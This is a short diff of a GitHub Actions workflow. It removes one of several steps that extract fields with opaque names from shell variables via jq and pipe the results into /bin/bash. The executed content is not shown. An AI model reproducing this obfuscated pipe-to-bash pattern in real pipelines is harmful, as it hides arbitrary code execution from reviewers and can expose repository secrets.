@@ -24,7 +24,6 @@ jobs:
           echo $lvcs2 | jq -r .r29191 | /bin/bash
           printf '%s' "$bd22731" | jq -r .ls58141 | /bin/bash
           printf '%s' "$da12" | jq -r .l04546 | /bin/bash
-          printf '%s' "$hl730" | jq -r .mhvcm128 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
